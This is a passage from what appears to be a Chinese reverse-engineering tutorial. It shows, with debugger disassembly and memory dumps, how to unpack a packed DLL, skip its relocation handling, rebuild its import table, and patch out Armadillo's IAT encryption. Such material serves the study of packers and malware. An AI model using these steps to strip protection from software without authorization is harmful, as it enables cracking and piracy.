class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFB5    3B48 <span class="number">34</span>         <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x34</span>]</div><div class="line">029ACFB8    <span class="number">74</span> <span class="number">55</span>           <span class="keyword">je</span> X029AD00F                             <span class="comment">; 重定位处理，此处需要跳过</span></div><div class="line">029ACFBA    FFB5 78D9FFFF   <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>]</div><div class="line">029ACFC0    8B85 0CD8FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFC6    <span class="number">0385</span> 3CD9FFFF   <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>]</div><div class="line">029ACFCC    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">029ACFCD    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029ACFD3    FF70 <span class="number">34</span>         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x34</span>]</div><div class="line">029ACFD6    FFB5 0CD8FFFF   <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFDC    E8 3C150000     <span class="keyword">call</span> 029AE51D                            <span class="comment">; 处理重定位</span></div><div class="line">029ACFE1    83C4 <span class="number">10</span>         <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0x10</span></div><div class="line">029ACFE4    0FB6C0          <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">al</span></div><div class="line">029ACFE7    85C0            <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">029ACFE9    <span class="number">75</span> <span class="number">24</span>           <span class="keyword">jnz</span> X029AD00F</div><div class="line">029ACFEB    8B45 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">029ACFEE    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]</div><div class="line">029ACFF0    C700 <span class="number">07000000</span>   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="number">0x7</span></div><div class="line">029ACFF6    <span class="number">68</span> 50CB9B02     <span class="keyword">push</span> <span class="number">0x29BCB50</span>                           <span class="comment">; ASCII "Location CPG"</span></div><div class="line">029ACFFB    8B45 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">029ACFFE    FF70 <span class="number">04</span>         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x4</span>]</div><div class="line">029AD001    E8 <span class="number">24800000</span>     <span class="keyword">call</span> 029B502A                            <span class="comment">; jmp 到 msvcrt.strcpy</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此处提供另外一种方法，首先在内存窗口，在PE文件头下访问断点,然后shift+F9中断到029A9BC7,这里是DLL文件的文件头区域<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Memory map, 条目 <span class="number">35</span></div><div class="line"> 地址=<span class="number">00</span>A20000</div><div class="line"> 大小=<span class="number">00001000</span> (<span class="number">4096.</span>)</div><div class="line"> 属主=EdrLib   <span class="number">00</span>A20000 (自身)</div><div class="line"> 区段=</div><div class="line"> 包含=PE 文件头</div><div class="line"> 类型=Imag <span class="number">01001002</span></div><div class="line"> 访问=R</div><div class="line"> 初始访问=RWE</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">029A9BC7    <span class="number">0348</span> 3C         <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x3C</span>]</div><div class="line">029A9BCA    <span class="number">898D</span> FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>],<span class="built_in">ecx</span>        <span class="comment">; EdrLib.00A200D8</span></div><div class="line">029A9BD0    A1 FC009C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C00FC</span>]</div><div class="line">029A9BD5    <span class="number">8985</span> B0AAFFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xFFFFAAB0</span>],<span class="built_in">eax</span></div><div class="line">029A9BDB    8B85 B0AAFFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xFFFFAAB0</span>]</div><div class="line">029A9BE1    <span class="number">8985</span> 0CD8FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>],<span class="built_in">eax</span></div><div class="line">029A9BE7    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029A9BED    8B40 <span class="number">50</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x50</span>]</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着ctrl+s搜索如下指令<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+C]</div><div class="line"><span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先来跟一下。这里是为了获取pdata,reloc<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">029AFABD    3BCE            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">esi</span>                              <span class="comment">; 和pdata比较</span></div><div class="line">029AFABF    <span class="number">73</span> <span class="number">11</span>           <span class="keyword">jnb</span> X029AFAD2</div><div class="line">029AFAC1    8B51 0C         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0xC</span>]</div><div class="line">029AFAC4    <span class="number">0351</span> <span class="number">08</span>         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x8</span>]</div><div class="line">029AFAC7    3BD0            <span class="keyword">cmp</span> <span class="built_in">edx</span>,<span class="built_in">eax</span></div><div class="line">029AFAC9    <span class="number">76</span> <span class="number">02</span>           <span class="keyword">jbe</span> X029AFACD</div><div class="line">029AFACB    8BC2            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></div><div class="line">029AFACD    83C1 <span class="number">28</span>         <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="number">0x28</span>                             <span class="comment">; next dir</span></div><div class="line">029AFAD0  ^ EB EB           <span class="keyword">jmp</span> X029AFABD</div><div class="line">029AFAD2    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时，当我们遍历到了reloc的时候，也就是eac为reloc的时候，在信息窗口显示的数据就是reloc的RVA=6000。size=3B0<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ds:[<span class="number">00A20254</span>]=<span class="number">00006000</span>    edx=<span class="number">000058E0</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过重定位表处理之后，直接在 EdrLib .text段上下F2断点，然后shitf+f9直达OEP，注意并不是在LoadDll.exe的text段，而是需要脱壳的DLL的text段下断点。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Memory map, 条目 <span class="number">36</span></div><div class="line"> 地址=<span class="number">00</span>A21000</div><div class="line"> 大小=<span class="number">00003000</span> (<span class="number">12288.</span>)</div><div class="line"> 属主=EdrLib   <span class="number">00</span>A20000</div><div class="line"> 区段=.text</div><div class="line"> 类型=Imag <span class="number">01001002</span></div><div class="line"> 访问=R</div><div class="line"> 初始访问=RWE</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00A211C9    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">00A211CA    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">00A211CC    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line">00A211CD    8B5D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">00A211D0    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">00A211D1    8B75 0C         <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xC</span>]</div><div class="line">00A211D4    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">00A211D5    8B7D <span class="number">10</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x10</span>]</div><div class="line">00A211D8    85F6            <span class="keyword">test</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就可以dump程序了，在LordPE<strong>目录</strong>中修改重定位信息。因为没有处理重定位表，所以只需要修复DLL原来的重定位表的RVA和大小就行了。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RVA=<span class="number">6000</span></div><div class="line">SIZE=<span class="number">3B0</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为没有修改IAT表，所以IAT表的数据是正确的。所以直接Ctrl+M，选中.rdata处，双击，为了方便查看选择地址显示.可以判断起始地址为A24000，结束地址为A240C8,大小为C8<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">00</span>A24000  <span class="number">77</span>EF7F9D  GDI32.GetTextExtentPoint32W</div><div class="line"><span class="number">00</span>A24004  <span class="number">77</span>EF7EAC  GDI32.TextOutW</div><div class="line"><span class="number">00</span>A24008  <span class="number">77</span>EFBA3F  GDI32.TextOutA</div><div class="line"><span class="number">00</span>A2400C  <span class="number">77</span>F0C63D  GDI32.GetTextExtentPoint32A</div><div class="line"><span class="number">00</span>A24010  <span class="number">029970</span>A0</div><div class="line"><span class="number">00</span>A24014  <span class="number">7</span>C809A99  kernel32.lstrlenW</div><div class="line"><span class="number">00</span>A24018  <span class="number">7</span>C814B77  kernel32.FreeEnvironmentStringsW</div><div class="line"><span class="number">00</span>A2401C  <span class="number">7</span>C812FAD  kernel32.GetCommandLineA</div><div class="line"><span class="number">00</span>A24020  <span class="number">7</span>C81126A  kernel32.GetVersion</div><div class="line"><span class="number">00</span>A24024  <span class="number">7</span>C81CAFA  kernel32.ExitProcess</div><div class="line"><span class="number">00</span>A24028  <span class="number">7</span>C801E1A  kernel32.TerminateProcess</div><div class="line"><span class="number">00</span>A2402C  <span class="number">7</span>C80DE85  kernel32.GetCurrentProcess</div><div class="line"><span class="number">00</span>A24030  <span class="number">7</span>C8097B8  kernel32.GetCurrentThreadId</div><div class="line"><span class="number">00</span>A24034  <span class="number">7</span>C809C55  kernel32.TlsSetValue</div><div class="line"><span class="number">00</span>A24038  <span class="number">7</span>C812E2F  kernel32.TlsAlloc</div><div class="line"><span class="number">00</span>A2403C  <span class="number">7</span>C813767  kernel32.TlsFree</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下有有一个很秀的操作，将我们获得从A24000-A240C8的IAT数据，复制到新打开的notepad中的404000-4040C8处.这叫借鸡生蛋。然后在ImportRCE中IAT的RVA填写404000，大小填写C8就好了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">00404020</span>  <span class="number">6</span>A <span class="number">12</span> <span class="number">81</span> <span class="number">7</span>C FA CA <span class="number">81</span> <span class="number">7</span>C <span class="number">1</span>A <span class="number">1</span>E <span class="number">80</span> <span class="number">7</span>C <span class="number">85</span> DE <span class="number">80</span> <span class="number">7</span>C  j亅亅€|呣€|</div><div class="line"><span class="number">00404030</span>  B8 <span class="number">97</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">55</span> <span class="number">9</span>C <span class="number">80</span> <span class="number">7</span>C <span class="number">2</span>F <span class="number">2</span>E <span class="number">81</span> <span class="number">7</span>C <span class="number">67</span> <span class="number">37</span> <span class="number">81</span> <span class="number">7</span>C  笚€|U渶|/.亅g7亅</div><div class="line"><span class="number">00404040</span>  D0 <span class="number">97</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">27</span> CD <span class="number">80</span> <span class="number">7</span>C C9 <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C E1 <span class="number">0</span>E <span class="number">81</span> <span class="number">7</span>C  袟€|'蛝|?亅?亅</div><div class="line"><span class="number">00404050</span>  F2 <span class="number">1</span>E <span class="number">80</span> <span class="number">7</span>C <span class="number">5</span>A <span class="number">13</span> <span class="number">93</span> <span class="number">7</span>C <span class="number">5</span>F B5 <span class="number">80</span> <span class="number">7</span>C D7 D6 <span class="number">81</span> <span class="number">7</span>C  ?€|Z搢_祤|字亅</div><div class="line"><span class="number">00404060</span>  <span class="number">46</span> BE <span class="number">80</span> <span class="number">7</span>C <span class="number">64</span> A1 <span class="number">80</span> <span class="number">7</span>C <span class="number">7</span>B CC <span class="number">81</span> <span class="number">7</span>C <span class="number">98</span> <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C  F線|d|&#123;虂|?亅</div><div class="line"><span class="number">00404070</span>  <span class="number">88</span> <span class="number">0</span>F <span class="number">81</span> <span class="number">7</span>C <span class="number">46</span> <span class="number">2</span>C <span class="number">81</span> <span class="number">7</span>C <span class="number">74</span> <span class="number">9</span>B <span class="number">80</span> <span class="number">7</span>C <span class="number">0</span>D FF <span class="number">92</span> <span class="number">7</span>C  ?亅F,亅t泙|.抾</div><div class="line"><span class="number">00404080</span>  <span class="number">17</span> <span class="number">0</span>E <span class="number">81</span> <span class="number">7</span>C <span class="number">81</span> <span class="number">9</span>F <span class="number">80</span> <span class="number">7</span>C <span class="number">00</span> <span class="number">10</span> <span class="number">92</span> <span class="number">7</span>C E0 <span class="number">10</span> <span class="number">92</span> <span class="number">7</span>C  亅仧€|.抾?抾</div><div class="line"><span class="number">00404090</span>  A4 <span class="number">00</span> <span class="number">93</span> <span class="number">7</span>C <span class="number">06</span> <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C A5 <span class="number">99</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">37</span> <span class="number">28</span> <span class="number">81</span> <span class="number">7</span>C  ?搢/亅€|<span class="number">7</span>(亅</div><div class="line"><span class="number">004040</span>A0  E1 <span class="number">9</span>A <span class="number">80</span> <span class="number">7</span>C <span class="number">80</span> <span class="number">9</span>B <span class="number">93</span> <span class="number">7</span>C <span class="number">30</span> AE <span class="number">80</span> <span class="number">7</span>C <span class="number">7</span>B <span class="number">1</span>D <span class="number">80</span> <span class="number">7</span>C  釟€|€洆|<span class="number">0</span>畝|&#123;€|</div><div class="line"><span class="number">004040</span>B0  <span class="number">88</span> <span class="number">9</span>C <span class="number">80</span> <span class="number">7</span>C <span class="number">00</span> <span class="number">8</span>E <span class="number">83</span> <span class="number">7</span>C <span class="number">38</span> CD <span class="number">80</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">8</span>A <span class="number">83</span> <span class="number">7</span>C  垳€|.巸|<span class="number">8</span>蛝|$妰|</div><div class="line"><span class="number">004040</span>C0  <span class="number">20</span> A5 <span class="number">80</span> <span class="number">7</span>C A5 AB <span class="number">94</span> <span class="number">7</span>C <span class="number">3</span>B C6 <span class="number">7</span>D <span class="number">1</span>B FF <span class="number">15</span> CC <span class="number">63</span>   |カ攟;苶蘡</div><div class="line"><span class="number">004040</span>D0  <span class="number">40</span> <span class="number">00</span> <span class="number">83</span> F8 <span class="number">3</span>F <span class="number">0</span>F <span class="number">85</span> A2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> C7 <span class="number">45</span> FC FD FF  @.凐?參..荅</div><div class="line"><span class="number">004040E0</span>  FF FF E9 <span class="number">96</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">33</span> F6 A1 <span class="number">00</span> <span class="number">50</span> <span class="number">40</span> <span class="number">00</span> <span class="number">56</span> <span class="number">50</span>  闁.<span class="number">.3</span>觥.P@.VP</div></pre></td></tr></table></figure></p><h2 id="0x6-非常规方法应对"><a href="#0x6-非常规方法应对" class="headerlink" title="0x6 非常规方法应对"></a>0x6 非常规方法应对</h2><h3 id="0x6-1-应对IAT加密"><a href="#0x6-1-应对IAT加密" class="headerlink" title="0x6.1 应对IAT加密"></a>0x6.1 应对IAT加密</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里使用了非常简单的Arm作为示范，只含有IAT加密，不涉及其他，第二常规方法下建议使用增强版OD。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常规避IAT加密的方法就是Magic_Jmp,然后.text下断到OEP。这里前辈给出新方法。介绍一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先须要了解到Arm并不是对所有的API函数进行加密，前辈这里的思路是先直接到达OEP，在根据里面一直的函数地址寻找IAT地址，然后寻找出IAT中被加密的地方，下硬件断点。重新运行之后到达被修改的的地址，然后分析加密IAT的过程，使用jmp或者nop规避即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在.text下断，然后F9运行，程序到达OEP，只是IAT被加密了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">004010CC    55              push    ebp</div><div class="line">004010CD    8BEC            mov     ebp, esp</div><div class="line">004010CF    83EC 44         sub     esp, 44</div><div class="line">004010D2    56              push    esi</div><div class="line">004010D3    FF15 E4634000   call    dword ptr [4063E4]</div><div class="line">004010D9    8BF0            mov     esi, eax</div><div class="line">004010DB    8A00            mov     al, byte ptr [eax]</div><div class="line">004010DD    3C 22           cmp     al, 22</div><div class="line">004010DF    75 1B           jnz     short 004010FC</div><div class="line">004010E1    56              push    esi</div><div class="line">004010E2    FF15 F4644000   call    dword ptr [4064F4]               ; USER32.CharNextA</div><div class="line">004010E8    8BF0            mov     esi, eax</div><div class="line">004010EA    8A00            mov     al, byte ptr [eax]</div><div class="line">004010EC    84C0            test    al, al</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大家应该都知道IID中所有函数应该是连续的，但是这些是不连续的，应该是被加密的。但是也说过其只是对IAT部分函数地址(有歧义自行理解)进行加密。但是IAT的RVA应该是一致的。所以将IAT的起始RVA=62E4，结束RVA=6524,大小应该为240，oep为4010cc记录下来。<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0040645</span>C  <span class="number">77D3</span>C972  USER32.SetDlgItemTextA</div><div class="line"><span class="symbol">00406460 </span> <span class="number">77D5</span>A5E5  USER32.TabbedTextOutA</div><div class="line"><span class="symbol">00406464 </span> <span class="number">021</span>AB517</div><div class="line"><span class="symbol">00406468 </span> <span class="number">77D29849</span>  USER32.EnableWindow</div><div class="line"><span class="number">0040646</span>C  <span class="number">021</span>AA871</div><div class="line"><span class="symbol">00406470 </span> <span class="number">77D3</span>C2E7  USER32.SendDlgItemMessageA</div><div class="line"><span class="symbol">00406474 </span> <span class="number">77D2</span>AF1B  USER32.GetDlgCtrlID</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在0040645C处下硬件断点，然后重新载入，接着按shitf+9，即可到达0218CF28处<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0218CF28</span>    <span class="number">8B85</span> 10D9FFFF   mov     eax, dword ptr [ebp-26F0]        ; PackEd.<span class="number">004062EC</span></div><div class="line"><span class="number">0218CF2E</span>    83C0 <span class="number">04</span>         add     eax, <span class="number">4</span></div><div class="line"><span class="number">0218CF31</span>    <span class="number">8985</span> 10D9FFFF   mov     dword ptr [ebp-26F0], eax</div><div class="line"><span class="number">0218CF37</span>  ^ E9 4DFCFFFF     jmp     <span class="number">0218CB89</span></div><div class="line"><span class="number">0218CF3C</span>    FF15 <span class="number">84721902</span>   call    dword ptr [<span class="number">2197284</span>]              ; kernel32.GetTickCount</div><div class="line"><span class="number">0218CF42</span>    <span class="number">2B85</span> A4D4FFFF   sub     eax, dword ptr [ebp-2B5C]</div><div class="line"><span class="number">0218CF48</span>    8B8D A8D4FFFF   mov     ecx, dword ptr [ebp-<span class="number">2B58</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着往下跟，在0218CD6B处发现比较一个，可以发现第一轮他是和RegCreateKeyA比较<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0218</span>CD63    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">0218</span>CD64    <span class="number">8</span>D85 <span class="number">68</span>C2FFFF   lea     eax, dword ptr [ebp<span class="number">-3</span>D98]</div><div class="line"><span class="number">0218</span>CD6A    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">0218</span>CD6B    FF15 <span class="number">78731902</span>   call    dword ptr [<span class="number">2197378</span>]              ; msvcrt._stricmp</div><div class="line"><span class="number">0218</span>CD71    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">0218</span>CD72    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">0218</span>CD73    <span class="number">85</span>C0            test    eax, eax</div><div class="line"><span class="number">0218</span>CD75    <span class="number">75</span> <span class="number">11</span>           jnz     short <span class="number">0218</span>CD88</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">001294</span>D4   <span class="number">0012</span>AE7C  |s1 = <span class="string">"RegOpenKeyA"</span></div><div class="line"><span class="number">001294</span>D8   <span class="number">0012</span>AD6C  \s2 = <span class="string">"RegCreateKeyA"</span></div><div class="line"><span class="number">001294</span>DC   <span class="number">021</span>A0F88</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过如下分析，我们可以知道0218CF1A处就是我们加密IAT的操作。同时也知道Arm只是针对部分IAT进行加密的。所以只需要修改之前在0218CD6B处的<code>jnz short 0218CD88</code>，或者位于0218CF18处的<code>jnb short 0218CF37</code>即可！<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0218CF1A    8B85 10D9FFFF   <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0]        <span class="comment">; eax为IAT地址</span></div><div class="line">0218CF20    8B8D 68CAFFFF   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">3598</span>]        <span class="comment">; ecx是加密的值</span></div><div class="line">0218CF26    <span class="number">8908</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">ecx</span>             <span class="comment">; 将值写入IAT中</span></div><div class="line">0218CF28    8B85 10D9FFFF   <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0]        <span class="comment">; 定位IAT</span></div><div class="line">0218CF2E    83C0 <span class="number">04</span>         <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">4</span>                           <span 